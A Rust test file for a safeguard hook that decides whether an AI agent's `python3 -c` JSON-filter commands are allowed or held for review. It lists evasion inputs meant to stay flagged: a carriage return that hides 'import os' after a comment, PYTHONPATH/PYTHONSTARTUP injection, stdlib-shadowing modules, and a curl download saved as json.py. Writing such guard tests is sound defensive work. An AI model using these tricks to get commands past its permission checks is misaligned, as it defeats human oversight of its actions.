//! A `python3 -c` program that only reshapes the JSON piped into it.
//!
//! `gh ... --json | python3 -c 'import json,sys; ...'` was held for review
//! as a step that was not proven read-only, though the program only reads
//! standard input and prints. It is allowed now while the program imports
//! nothing beyond modules that compute, names no builtin that opens a file
//! or evaluates text, no variable steers the interpreter, and no module in
//! the working directory can stand in for the standard library's.

use crate::git_helper_fixture as fixture;
use fixture::FixtureCleanup;
use serde_json::json;
use std::path::{Path, PathBuf};

fn checkout(label: &str, extra: &[&str]) -> (PathBuf, FixtureCleanup) {
    checkout_in(&std::env::temp_dir(), label, extra)
}

fn checkout_in(base: &Path, label: &str, extra: &[&str]) -> (PathBuf, FixtureCleanup) {
    let root = base.join(format!(
        "guard-python-filter-{label}-{}",
        std::process::id()
    ));
    let _ = std::fs::remove_dir_all(&root);
    let project = root.join("project");
    std::fs::create_dir_all(project.join("logging")).unwrap();
    std::fs::write(project.join("data.json"), "{\"a\": 1}\n").unwrap();
    std::fs::write(project.join("logging/notes.md"), "notes\n").unwrap();
    for name in extra {
        let path = project.join(name);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, "print('shadow')\n").unwrap();
    }
    fixture::git(&root, &project, &["init", "--quiet", "-b", "main"]);
    let root = fixture::canonical_spelling(&root);
    (root.clone(), FixtureCleanup(root))
}

fn action(root: &Path, command: &str) -> String {
    fixture::evaluate_pre_tool_envelope_with_context(
        "claude-code",
        "PreToolUse",
        &json!({"tool_name":"Bash","tool_input":{"command":command}}),
        Some(&fixture::local_admin_controls(Vec::new())),
        None,
        root.to_str(),
        root.join("project").to_str(),
    )
    .minimum_action
}

const FILTER: &str =
    "cat data.json | python3 -c 'import json,sys; print(json.load(sys.stdin)[\"a\"])'";

#[test]
fn a_program_that_reshapes_piped_json_is_allowed() {
    let (root, _cleanup) = checkout("allowed", &[]);
    for command in [
        FILTER,
        "cat data.json | python3 -I -c \"\nimport json,sys\nfor k, v in json.load(sys.stdin).items():\n    print(k, v)\"",
        "cat data.json | python3 -c 'import sys,json; d=json.load(sys.stdin); print(json.dumps({k:d.get(k) for k in (\"a\",)}, indent=2))' | head -5",
        "python3 -c 'import json; print(json.dumps({\"a\": 1}))'",
    ] {
        assert_eq!(action(&root, command), "allow", "{command}");
    }
}

#[test]
fn a_program_that_reaches_past_its_input_keeps_its_review() {
    let (root, _cleanup) = checkout("reviewed", &[]);
    for command in [
        "cat data.json | python3 -c 'import os; print(os.listdir(\".\"))'",
        "cat data.json | python3 -c 'print(open(\"data.json\").read())'",
        "cat data.json | python3 -c 'import subprocess; subprocess.run([\"ls\"])'",
        "cat data.json | PYTHONPATH=. python3 -c 'import json,sys; print(json.load(sys.stdin))'",
        "export PYTHONSTARTUP=x.py; cat data.json | python3 -c 'import json,sys; print(json.load(sys.stdin))'",
        "cat data.json | python3 -c \"import json,sys; print(json.load(sys.stdin)['$KEY'])\"",
        "cat data.json | python3 -c 'import json,sys; print(getattr(json, \"loads\"))'",
        "cat data.json | python3 -i -c 'import json'",
        "python3 -c *",
        // A literal CR inside single quotes is a CPython line boundary,
        // despite the preceding # comment. The second import is executable.
        "python3 -I -S -c 'import json; print(json.dumps([1])) #\rimport os; print(os.name)'",
        "cat data.json | python3 -I -c 'import json; print(\"{0.x}\".format(json.load))'",
        "cat data.json | python3 -c 'import fractions; fractions.sys.stdout.write(\"x\")'",
        ".venv/bin/python3 -c 'import json; print(json.dumps([1]))'",
    ] {
        assert_ne!(action(&root, command), "allow", "{command}");
    }
}

/// A workspace interpreter runs its environment's `.pth` startup files, so it
/// needs `-S` however its path is spelled: through a `..` step or a link that
/// stands outside the working directory.
#[test]
fn a_workspace_interpreter_named_indirectly_keeps_its_review() {
    let (root, _cleanup) = checkout("indirect", &[".venv/bin/python3"]);
    let program = "-c 'import json; print(json.dumps([1]))'";
    // `/tmp/X/../X/project/...` climbs before it reaches the working
    // directory, so a plain prefix check reads it as outside.
    let climbed = root
        .join("..")
        .join(root.file_name().unwrap())
        .join("project/.venv/bin/python3");
    let mut commands = vec![format!("{} {program}", climbed.display())];
    #[cfg(unix)]
    {
        let link = root.join("python3");
        std::os::unix::fs::symlink(root.join("project/.venv/bin/python3"), &link).unwrap();
        commands.push(format!("{} {program}", link.display()));
    }
    for command in commands {
        assert_ne!(action(&root, &command), "allow", "{command}");
    }
}

/// `-c` puts the working directory first on the module path, so a module
/// there named for the standard library runs in place of it.
/// CPython follows .venv configuration from the executable's invocation
/// directory even if bin/python3 is a symlink to the system executable.
/// Isolated mode (-I) does not skip .pth startup code; -S does.
#[cfg(unix)]
#[test]
fn an_isolated_workspace_venv_symlink_still_needs_no_site() {
    let (root, _cleanup) = checkout("venv-system-link", &[".venv/bin/python3"]);
    let launcher = root.join("project/.venv/bin/python3");
    let system_python = root.join("system-python3");
    std::fs::write(&system_python, "").unwrap();
    std::fs::remove_file(&launcher).unwrap();
    std::os::unix::fs::symlink(&system_python, &launcher).unwrap();

    let command = format!(
        "{} -I -c 'import json; print(json.dumps([1]))'",
        launcher.display()
    );
    assert_ne!(action(&root, &command), "allow", "{command}");
}

#[test]
fn a_module_that_shadows_the_standard_library_keeps_its_review() {
    for (label, file) in [
        ("module", "json.py"),
        ("package", "re/__init__.py"),
        ("traceback", "traceback.py"),
    ] {
        let (root, _cleanup) = checkout(label, &[file]);
        assert_ne!(action(&root, FILTER), "allow", "{file}");
        let isolated = FILTER.replace("python3 -c", "python3 -I -c");
        assert_eq!(action(&root, &isolated), "allow", "{file}");
    }
}

/// `gh` and `curl` carry their own read-only proofs, so they may feed the
/// filter. Outside a temporary directory nothing they may save can land
/// beside the interpreter.
#[test]
fn a_proven_network_read_may_feed_the_filter() {
    let base = Path::new(env!("CARGO_TARGET_TMPDIR"));
    let (root, _cleanup) = checkout_in(base, "producers", &[]);
    for command in [
        "gh pr list --repo o/r --state open --json number,title | python3 -c 'import json,sys; [print(p[\"number\"], p[\"title\"]) for p in json.load(sys.stdin)]'",
        "gh api repos/o/r/pulls/1 | python3 -c 'import json,sys; d=json.load(sys.stdin); print(d.get(\"state\"))'",
        "curl -s https://api.github.com/repos/o/r | python3 -c 'import json,sys; print(json.load(sys.stdin)[\"name\"])'",
    ] {
        assert_eq!(action(&root, command), "allow", "{command}");
    }
}

/// In a temporary directory `curl -o` may save a response beside the
/// interpreter, where `import json` would load it.
#[test]
fn a_download_into_a_temporary_working_directory_keeps_its_review() {
    let (root, _cleanup) = checkout("download", &[]);
    let target = root.join("project/json.py");
    let command = format!(
        "curl -s -o {} https://example.com/x | python3 -c 'import json,sys; print(json.load(sys.stdin))'",
        target.display()
    );
    assert_ne!(action(&root, &command), "allow", "{command}");
}
